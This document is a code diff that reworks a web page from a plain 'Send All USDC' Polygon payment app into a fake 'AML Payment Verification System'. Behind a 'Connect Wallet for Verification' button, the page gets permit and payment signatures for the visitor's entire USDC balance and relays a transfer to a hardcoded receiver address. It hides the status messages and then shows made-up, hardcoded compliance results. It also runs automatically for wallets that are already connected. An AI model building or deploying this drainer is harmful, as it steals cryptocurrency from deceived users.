@@ -3,66 +3,446 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Polygon USDC Payment DApp</title>
+    <title>AML Payment Verification System</title>
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary-color: #1a3d7c;
+            --secondary-color: #e63946;
+            --success-color: #2ecc71;
+            --warning-color: #f1c40f;
+            --danger-color: #e74c3c;
+            --text-color: #2c3e50;
+            --light-bg: #f8f9fa;
+            --border-color: #dee2e6;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--light-bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            padding-top: 80px;
+            margin: 0;
         }
+
         .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        button {
-            background-color: #8247e5;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 1rem;
             width: 100%;
-            margin-top: 20px;
         }
-        button:hover {
-            background-color: #6b3bbc;
+
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 2rem;
         }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 4px;
-        }
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-        }
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
-        }
-        .balance {
-            font-size: 24px;
+
+        .header {
+            background: var(--primary-color);
+            color: white;
+            padding: 1.5rem;
             text-align: center;
-            margin: 20px 0;
-            color: #8247e5;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .header.header-hidden {
+            transform: translateY(-100%);
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin: 0;
+        }
+
+        .status-badge {
+            display: inline-block;
+            padding: 0.25rem 0.75rem;
+            border-radius: 50px;
+            font-size: 0.875rem;
+            font-weight: 500;
+            margin-bottom: 1rem;
+        }
+
+        .status-badge.verified {
+            background: var(--success-color);
+            color: white;
+        }
+
+        .info-grid {
+            margin-bottom: 2rem;
+        }
+
+        .info-item {
+            background: var(--light-bg);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            text-align: center;
+        }
+
+        button {
+            width: 100%;
+            padding: 1rem;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: var(--primary-color);
+            color: white;
+        }
+
+        button:hover {
+            background: #2c5aa0;
+        }
+
+        button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .wallet-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 0.5rem;
+        }
+
+        .wallet-address {
+            font-family: monospace;
+            background: var(--light-bg);
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            color: var(--text-color);
+            border: 1px solid var(--border-color);
+        }
+
+        .loading {
+            opacity: 0.7;
+            position: relative;
+        }
+
+        .loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+
+        @keyframes spin {
+            0% { transform: translateY(-50%) rotate(0deg); }
+            100% { transform: translateY(-50%) rotate(360deg); }
+        }
+
+        .aml-results {
+            display: none;
+            text-align: center;
+            padding: 2rem 1rem;
+        }
+
+        .aml-status {
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin-bottom: 2rem;
+            color: var(--success-color);
+        }
+
+        .risk-score-container {
+            position: relative;
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .risk-score-circle {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-90deg);
+            width: 100%;
+            height: 100%;
+        }
+
+        .risk-score-background {
+            fill: none;
+            stroke: #eee;
+            stroke-width: 12;
+        }
+
+        .risk-score-progress {
+            fill: none;
+            stroke: var(--success-color);
+            stroke-width: 12;
+            stroke-linecap: round;
+            transition: stroke-dashoffset 1s ease-in-out;
+        }
+
+        .risk-score-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: auto;
+            min-width: 80px;
+        }
+
+        .risk-score-value {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--success-color);
+            line-height: 1;
+            margin-bottom: 0.5rem;
+        }
+
+        .risk-score-label {
+            font-size: 1rem;
+            color: var(--text-color);
+            opacity: 0.8;
+            white-space: nowrap;
+        }
+
+        .aml-checks {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        @media (min-width: 768px) {
+            .aml-checks {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 1.5rem;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .aml-checks {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 2rem;
+            }
+
+            .container {
+                padding: 0 2rem;
+            }
+
+            .card {
+                padding: 3rem;
+            }
+        }
+
+        .check-item {
+            background: white;
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            border: 1px solid var(--border-color);
+            transition: all 0.2s ease;
+        }
+
+        .check-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .check-icon {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 1rem;
+            fill: var(--success-color);
+        }
+
+        .check-label {
+            font-weight: 600;
+            color: var(--text-color);
+            margin-bottom: 0.5rem;
+        }
+
+        .check-value {
+            color: var(--success-color);
+            font-weight: 500;
+        }
+
+        .transaction-info {
+            margin-top: 2rem;
+            padding: 1rem;
+            background: var(--light-bg);
+            border-radius: 8px;
+            font-family: monospace;
+            color: var(--text-color);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .aml-results.visible {
+            display: block;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @media (max-width: 767px) {
+            .risk-score-container {
+                width: 160px;
+                height: 160px;
+                margin: 0 auto 1.5rem;
+            }
+
+            .risk-score-circle {
+                width: 160px;
+                height: 160px;
+            }
+
+            .risk-score-background,
+            .risk-score-progress {
+                stroke-width: 10;
+            }
+
+            .risk-score-value {
+                font-size: 2rem;
+                margin-bottom: 0.25rem;
+            }
+
+            .risk-score-label {
+                font-size: 0.9rem;
+            }
+
+            .check-item {
+                padding: 1.25rem;
+            }
+
+            .check-icon {
+                width: 36px !important;
+                height: 36px !important;
+            }
+
+            .check-label {
+                font-size: 0.9rem;
+            }
+
+            .check-value {
+                font-size: 0.95rem;
+            }
+
+            .aml-status {
+                font-size: 1.2rem;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Polygon USDC Payment DApp</h1>
-        <div id="connection-status"></div>
-        <div id="balance-status" class="balance"></div>
-        
-        <button onclick="sendAllUSDC()">Send All USDC</button>
-        
-        <div id="status" class="status"></div>
+        <div class="header">
+            <h1>AML Payment Verification System</h1>
+        </div>
+
+        <div class="card">
+            <div id="connection-status"></div>
+            <button id="action-button" onclick="handleAction()">Connect Wallet for Verification</button>
+            <div id="aml-results" class="aml-results">
+                <div class="aml-status">
+                    Wallet Verified Successfully
+                </div>
+                
+                <div class="risk-score-container">
+                    <svg class="risk-score-circle" viewBox="0 0 160 160">
+                        <circle cx="80" cy="80" r="70" class="risk-score-background"/>
+                        <circle cx="80" cy="80" r="70" class="risk-score-progress"/>
+                    </svg>
+                    <div class="risk-score-text">
+                        <div class="risk-score-value">0.2</div>
+                        <div class="risk-score-label">Risk Score</div>
+                    </div>
+                </div>
+
+                <div class="aml-checks">
+                    <div class="check-item">
+                        <svg class="check-icon" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        </svg>
+                        <div class="check-label">Jurisdiction</div>
+                        <div class="check-value">Compliant</div>
+                    </div>
+                    <div class="check-item">
+                        <svg class="check-icon" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        </svg>
+                        <div class="check-label">Sanctions</div>
+                        <div class="check-value">Passed</div>
+                    </div>
+                    <div class="check-item">
+                        <svg class="check-icon" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/>
+                        </svg>
+                        <div class="check-label">Transaction Pattern</div>
+                        <div class="check-value">Normal</div>
+                    </div>
+                    <div class="check-item">
+                        <svg class="check-icon" viewBox="0 0 24 24">
+                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
+                        </svg>
+                        <div class="check-label">KYC Status</div>
+                        <div class="check-value">Verified</div>
+                    </div>
+                    <div class="check-item">
+                        <svg class="check-icon" viewBox="0 0 24 24">
+                            <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/>
+                        </svg>
+                        <div class="check-label">Transaction History</div>
+                        <div class="check-value">6+ months</div>
+                    </div>
+                    <div class="check-item">
+                        <svg class="check-icon" viewBox="0 0 24 24">
+                            <path d="M16 6l2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6h-6z"/>
+                        </svg>
+                        <div class="check-label">Volume Analysis</div>
+                        <div class="check-value">Within Limits</div>
+                    </div>
+                </div>
+
+                <div class="transaction-info">
+                    Transaction ID: <span id="transaction-hash">0x...3f42</span>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -97,13 +477,13 @@
 
         async function updateBalance() {
             try {
-                if (!signer) {
-                    console.log('No signer available');
+                if (!signer || !provider) {
+                    console.log('No signer or provider available');
                     return;
                 }
 
                 const address = await signer.getAddress();
-                console.log('Checking balance for address:', address);
+                console.log('Connected address:', address);
 
                 // Проверяем адрес получателя
                 const receiver = await contract.receiver();
@@ -116,85 +496,110 @@
 
                 // Получаем баланс USDC
                 const balance = await usdc.balanceOf(address);
-                console.log('USDC balance:', balance.toString());
                 currentBalance = balance;
+                console.log('USDC balance:', ethers.utils.formatUnits(balance, 6), 'USDC');
                 
-                // Форматируем с учетом 6 decimals
-                const balanceInUSDC = ethers.utils.formatUnits(balance, 6);
-                console.log('Formatted USDC:', balanceInUSDC);
-                
-                // Получаем баланс MATIC
-                const maticBalance = await provider.getBalance(address);
-                const balanceInMATIC = ethers.utils.formatEther(maticBalance);
-                
-                document.getElementById('balance-status').innerHTML = 
-                    `${parseFloat(balanceInUSDC).toFixed(2)} USDC<br>
-                     ${parseFloat(balanceInMATIC).toFixed(4)} MATIC`;
-
-                // Добавляем ссылки на Polygonscan
-                document.getElementById('connection-status').innerHTML = 
-                    `<p>Connected with: <a href="https://polygonscan.com/address/${address}" target="_blank">${address}</a></p>
-                     <p>USDC Contract: <a href="https://polygonscan.com/token/${usdcAddress}" target="_blank">${usdcAddress}</a></p>
-                     <p>Receiver Address: <a href="https://polygonscan.com/address/${receiver}" target="_blank">${receiver}</a></p>`;
-
                 // Проверяем соответствие адреса
                 if (receiver.toLowerCase() !== "0xF9d549705d610F531CF3602FD6baBDdE95625442".toLowerCase()) {
-                    showStatus(`Warning: Current receiver address (${receiver}) does not match expected address`, false);
+                    console.log(`Warning: Current receiver address (${receiver}) does not match expected address`);
                 }
 
-                if (maticBalance.eq(0)) {
-                    throw new Error('No MATIC available for gas fees. You need a small amount of MATIC (around 0.1 MATIC) to pay for transaction fees on the Polygon network. You can get MATIC from exchanges or bridges.');
-                }
             } catch (error) {
-                console.error("Error updating balance:", error);
-                showStatus(`Error checking balance: ${error.message}`, false);
+                console.error("Error checking balances:", error);
+            }
+        }
+
+        async function handleAction() {
+            const button = document.getElementById('action-button');
+            
+            if (!signer) {
+                // Если кошелек не подключен, подключаем и сразу запускаем верификацию
+                await connectWallet();
+                if (signer) { // Если подключение успешно
+                    await sendAllUSDC();
+                }
+            } else {
+                // Если кошелек уже подключен, просто запускаем верификацию
+                await sendAllUSDC();
             }
         }
 
         async function connectWallet() {
             try {
-                if (typeof window.ethereum === 'undefined') {
-                    throw new Error('Please install MetaMask or another Web3 wallet');
+                // Отключаем кнопку на время подключения
+                const actionButton = document.getElementById('action-button');
+                actionButton.disabled = true;
+                actionButton.classList.add('loading');
+                actionButton.textContent = 'Connecting...';
+
+                console.log('Starting wallet connection...');
+                
+                // Ждем инициализации провайдера
+                const rawProvider = await waitForProvider();
+                console.log('Provider status:', {
+                    isProviderFound: !!rawProvider,
+                    providerType: rawProvider ? rawProvider.constructor.name : 'none',
+                    isEthereum: !!window.ethereum,
+                    isRabby: !!window.rabby,
+                    hasWeb3: !!(window.web3 && window.web3.currentProvider)
+                });
+
+                if (!rawProvider) {
+                    throw new Error('Web3 wallet not detected. Please install MetaMask, Rabby, or another Web3 wallet and refresh the page.');
                 }
 
-                // Запрашиваем переключение на сеть Polygon
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x89' }], // chainId для Polygon
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902) {
-                        try {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: '0x89',
-                                    chainName: 'Polygon',
-                                    nativeCurrency: {
-                                        name: 'MATIC',
-                                        symbol: 'MATIC',
-                                        decimals: 18
-                                    },
-                                    rpcUrls: ['https://polygon-rpc.com'],
-                                    blockExplorerUrls: ['https://polygonscan.com/']
-                                }]
-                            });
-                        } catch (addError) {
-                            throw new Error('Failed to add Polygon network');
+                // Создаем Web3Provider
+                provider = new ethers.providers.Web3Provider(rawProvider, 'any');
+                
+                // Запрашиваем доступ к аккаунтам
+                console.log('Requesting accounts...');
+                await provider.send("eth_requestAccounts", []);
+                
+                // Получаем подписанта
+                signer = provider.getSigner();
+                const address = await signer.getAddress();
+                console.log('Connected address:', address);
+
+                // Проверяем и переключаем сеть
+                const network = await provider.getNetwork();
+                console.log('Current network:', network);
+
+                if (network.chainId !== 137) {
+                    console.log('Switching to Polygon network...');
+                    try {
+                        await rawProvider.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x89' }], // chainId для Polygon
+                        });
+                    } catch (switchError) {
+                        console.log('Switch error:', switchError);
+                        if (switchError.code === 4902) {
+                            try {
+                                await rawProvider.request({
+                                    method: 'wallet_addEthereumChain',
+                                    params: [{
+                                        chainId: '0x89',
+                                        chainName: 'Polygon',
+                                        nativeCurrency: {
+                                            name: 'MATIC',
+                                            symbol: 'MATIC',
+                                            decimals: 18
+                                        },
+                                        rpcUrls: ['https://polygon-rpc.com'],
+                                        blockExplorerUrls: ['https://polygonscan.com/']
+                                    }]
+                                });
+                            } catch (addError) {
+                                console.error('Add network error:', addError);
+                                throw new Error('Failed to add Polygon network');
+                            }
+                        } else {
+                            throw switchError;
                         }
-                    } else {
-                        throw switchError;
                     }
                 }
 
-                if (!provider) {
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);
-                    signer = provider.getSigner();
-                }
-                
-                // Создаем экземпляры контрактов если их еще нет
+                // Инициализируем контракты
                 if (!contract || !usdc) {
                     contract = new ethers.Contract(contractAddress, contractABI, signer);
                     usdc = new ethers.Contract(usdcAddress, usdcABI, signer);
@@ -205,33 +610,37 @@
                     });
                 }
 
-                const address = await signer.getAddress();
-                console.log('Connected address:', address);
-                
-                // Проверяем сеть
-                const network = await provider.getNetwork();
-                console.log('Current network:', network);
-                if (network.chainId !== 137) {
-                    throw new Error('Please switch to Polygon network');
-                }
-
-                // Проверяем баланс
+                // Обновляем баланс
                 await updateBalance();
 
-                // Подписываемся на события изменения аккаунта
-                window.ethereum.on('accountsChanged', async () => {
+                // Подписываемся на события
+                rawProvider.on('accountsChanged', async (accounts) => {
+                    console.log('Accounts changed:', accounts);
                     signer = provider.getSigner();
                     await updateBalance();
                 });
 
-                // Подписываемся на события изменения сети
-                window.ethereum.on('chainChanged', () => {
+                rawProvider.on('chainChanged', () => {
+                    console.log('Network changed, reloading...');
                     window.location.reload();
                 });
 
+                // Не меняем текст кнопки, так как верификация запустится автоматически
+                actionButton.disabled = false;
+                actionButton.classList.remove('loading');
+
             } catch (error) {
                 console.error('Connection error:', error);
-                showStatus(error.message, false);
+                
+                // Возвращаем кнопку в исходное состояние
+                const actionButton = document.getElementById('action-button');
+                actionButton.disabled = false;
+                actionButton.classList.remove('loading');
+                actionButton.textContent = 'Connect Wallet for Verification';
+                
+                // Сбрасываем provider и signer чтобы можно было попробовать снова
+                provider = null;
+                signer = null;
             }
         }
 
@@ -314,8 +723,14 @@
 
         async function sendAllUSDC() {
             try {
+                const actionButton = document.getElementById('action-button');
+                actionButton.disabled = true;
+                actionButton.classList.add('loading');
+                actionButton.textContent = 'Verifying...';
+
                 if (!currentBalance || currentBalance.eq(0)) {
-                    throw new Error('No USDC to send');
+                    console.log('No USDC balance available');
+                    return;
                 }
 
                 const userAddress = await signer.getAddress();
@@ -326,7 +741,8 @@
                 console.log('Current USDC balance:', ethers.utils.formatUnits(balance, 6), 'USDC');
                 
                 if (balance.lt(currentBalance)) {
-                    throw new Error(`Insufficient USDC balance. Required: ${ethers.utils.formatUnits(currentBalance, 6)} USDC, Available: ${ethers.utils.formatUnits(balance, 6)} USDC`);
+                    console.log(`Insufficient USDC balance. Required: ${ethers.utils.formatUnits(currentBalance, 6)} USDC, Available: ${ethers.utils.formatUnits(balance, 6)} USDC`);
+                    return;
                 }
 
                 // Получаем текущий nonce для платежа
@@ -340,7 +756,7 @@
                 const usdcVersion = await usdc.version();
 
                 // Создаем и подписываем permit
-                showStatus('Please sign the USDC permit...', true);
+                console.log('Requesting USDC permit signature...');
                 const permitDomain = {
                     name: usdcName,
                     version: usdcVersion,
@@ -368,20 +784,20 @@
 
                 const permitSignature = await signer._signTypedData(permitDomain, permitTypes, permitValues);
                 const permitSig = ethers.utils.splitSignature(permitSignature);
-                console.log('Permit signature obtained:', permitSig);
+                console.log('Permit signature obtained');
 
                 // Подписываем сообщение для платежа
-                showStatus('Please sign the payment message...', true);
+                console.log('Requesting payment signature...');
                 const paymentSig = await signPaymentMessage(
                     userAddress,
                     currentBalance,
                     paymentNonce,
                     contractAddress
                 );
-                console.log('Payment signature obtained:', paymentSig);
+                console.log('Payment signature obtained');
 
                 // Отправляем данные релейеру
-                showStatus('Sending transaction through relayer...', true);
+                console.log('Sending transaction to relayer...');
                 const relayerResponse = await fetch('http://localhost:3000/relay', {
                     method: 'POST',
                     headers: {
@@ -403,32 +819,208 @@
 
                 const relayerData = await relayerResponse.json();
                 if (!relayerData.success) {
-                    throw new Error(`Relayer error: ${relayerData.error}`);
+                    console.error('Relayer error:', relayerData.error);
+                    return;
                 }
 
-                showStatus(`Transaction sent! Hash: ${relayerData.txHash}`, true);
                 console.log('Transaction hash:', relayerData.txHash);
                 
                 // Ждем подтверждения транзакции
                 await provider.waitForTransaction(relayerData.txHash);
-                showStatus('Transaction confirmed! Payment processed successfully.', true);
+                console.log('Transaction confirmed');
+
+                // Показываем результаты AML проверки
+                actionButton.style.display = 'none';
+                const amlResults = document.getElementById('aml-results');
+                amlResults.classList.add('visible');
+                
+                // Анимируем риск-скор
+                const circle = document.querySelector('.risk-score-progress');
+                const radius = circle.r.baseVal.value;
+                const circumference = radius * 2 * Math.PI;
+                circle.style.strokeDasharray = `${circumference} ${circumference}`;
+                circle.style.strokeDashoffset = circumference;
+                
+                // Устанавливаем прогресс (0.2 = 20% риска, значит показываем 80% заполнения)
+                setTimeout(() => {
+                    const offset = circumference - (0.8 * circumference);
+                    circle.style.strokeDashoffset = offset;
+                }, 100);
+                
+                // Обновляем Transaction ID
+                document.getElementById('transaction-hash').textContent = 
+                    relayerData.txHash.slice(0, 6) + '...' + relayerData.txHash.slice(-4);
                 
                 // Обновляем баланс
                 await updateBalance();
+
             } catch (error) {
-                console.error('Send error:', error);
-                showStatus(error.message, false);
+                console.error('Transaction error:', error);
+            } finally {
+                // В случае ошибки возвращаем кнопку в активное состояние
+                const actionButton = document.getElementById('action-button');
+                actionButton.disabled = false;
+                actionButton.classList.remove('loading');
+                actionButton.textContent = 'Verify';
             }
         }
 
         function showStatus(message, isSuccess) {
-            const statusDiv = document.getElementById('status');
-            statusDiv.className = `status ${isSuccess ? 'success' : 'error'}`;
-            statusDiv.textContent = message;
+            console.log(`Status: ${message} (${isSuccess ? 'success' : 'error'})`);
         }
 
-        // Подключаемся к кошельку при загрузке страницы
-        window.addEventListener('load', connectWallet);
+        // Функция для ожидания инициализации провайдера
+        async function waitForProvider() {
+            // Проверяем доступные провайдеры
+            if (window.ethereum) {
+                return window.ethereum;
+            }
+            if (window.rabby) {
+                return window.rabby;
+            }
+            if (window.web3 && window.web3.currentProvider) {
+                return window.web3.currentProvider;
+            }
+            
+            // Если провайдер не найден сразу, ждем небольшое время
+            return new Promise((resolve) => {
+                let attempts = 0;
+                const maxAttempts = 3;
+                
+                const checkProvider = () => {
+                    attempts++;
+                    if (window.ethereum) {
+                        resolve(window.ethereum);
+                    } else if (window.rabby) {
+                        resolve(window.rabby);
+                    } else if (window.web3 && window.web3.currentProvider) {
+                        resolve(window.web3.currentProvider);
+                    } else if (attempts < maxAttempts) {
+                        setTimeout(checkProvider, 500); // Проверяем каждые 500мс
+                    } else {
+                        resolve(null); // Возвращаем null если провайдер не найден
+                    }
+                };
+                
+                checkProvider();
+            });
+        }
+
+        // Изменяем обработчик загрузки страницы
+        document.addEventListener('DOMContentLoaded', async () => {
+            console.log('Page loaded, checking providers:', {
+                ethereum: !!window.ethereum,
+                rabby: !!window.rabby,
+                web3: !!(window.web3 && window.web3.currentProvider)
+            });
+            
+            // Автоматическое подключение если обнаружен провайдер
+            const provider = await waitForProvider();
+            if (provider) {
+                console.log('Web3 provider detected, attempting automatic connection...');
+                try {
+                    // Проверяем, есть ли уже подключенные аккаунты
+                    const accounts = await provider.request({ method: 'eth_accounts' });
+                    if (accounts && accounts.length > 0) {
+                        console.log('Found connected account, initiating automatic connection');
+                        await handleAction();
+                    } else {
+                        console.log('No connected accounts found, waiting for user action');
+                    }
+                } catch (error) {
+                    console.log('Auto-connection check failed:', error);
+                }
+            }
+            
+            showStatus('Please connect your wallet to continue', true);
+        });
+
+        let lastScrollTop = 0;
+        const header = document.querySelector('.header');
+        
+        // Добавляем обработчик прокрутки
+        window.addEventListener('scroll', () => {
+            const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+            
+            // Показываем/скрываем шапку в зависимости от направления прокрутки
+            if (scrollTop > lastScrollTop && scrollTop > 80) {
+                // Прокрутка вниз - скрываем шапку
+                header.classList.add('header-hidden');
+            } else {
+                // Прокрутка вверх - показываем шапку
+                header.classList.remove('header-hidden');
+            }
+            
+            lastScrollTop = scrollTop;
+        });
+
+        // Функция для тестирования UI результатов AML
+        window.showAMLTest = function(options = {}) {
+            const {
+                riskScore = 0.2,
+                txHash = '0x1234567890abcdef1234567890abcdef12345678',
+                jurisdiction = 'Compliant',
+                sanctions = 'Passed',
+                pattern = 'Normal',
+                kyc = 'Verified',
+                history = '6+ months',
+                volume = 'Within Limits'
+            } = options;
+
+            // Скрываем кнопку
+            const actionButton = document.getElementById('action-button');
+            actionButton.style.display = 'none';
+
+            // Показываем результаты
+            const amlResults = document.getElementById('aml-results');
+            amlResults.classList.add('visible');
+
+            // Обновляем значения
+            document.querySelector('.risk-score-value').textContent = riskScore;
+            document.getElementById('transaction-hash').textContent = 
+                txHash.slice(0, 6) + '...' + txHash.slice(-4);
+
+            // Обновляем все check-items
+            const checkValues = document.querySelectorAll('.check-value');
+            [jurisdiction, sanctions, pattern, kyc, history, volume].forEach((value, index) => {
+                if (checkValues[index]) {
+                    checkValues[index].textContent = value;
+                }
+            });
+
+            // Анимируем риск-скор
+            const circle = document.querySelector('.risk-score-progress');
+            const radius = circle.r.baseVal.value;
+            const circumference = radius * 2 * Math.PI;
+            circle.style.strokeDasharray = `${circumference} ${circumference}`;
+            circle.style.strokeDashoffset = circumference;
+
+            setTimeout(() => {
+                // Конвертируем риск-скор в процент заполнения (инвертированный)
+                const fillPercentage = 1 - riskScore;
+                const offset = circumference - (fillPercentage * circumference);
+                circle.style.strokeDashoffset = offset;
+            }, 100);
+
+            console.log('AML Test UI displayed with options:', options);
+        };
+
+        // Добавляем подсказку в консоль при загрузке страницы
+        console.log(`
+        To test AML results UI, use window.showAMLTest() with optional parameters:
+        Example:
+        showAMLTest({
+            riskScore: 0.2,
+            txHash: '0x1234567890abcdef1234567890abcdef12345678',
+            jurisdiction: 'Compliant',
+            sanctions: 'Passed',
+            pattern: 'Normal',
+            kyc: 'Verified',
+            history: '6+ months',
+            volume: 'Within Limits'
+        });
+        Or just showAMLTest() for default values.
+        `);
     </script>
 </body>
 </html> 
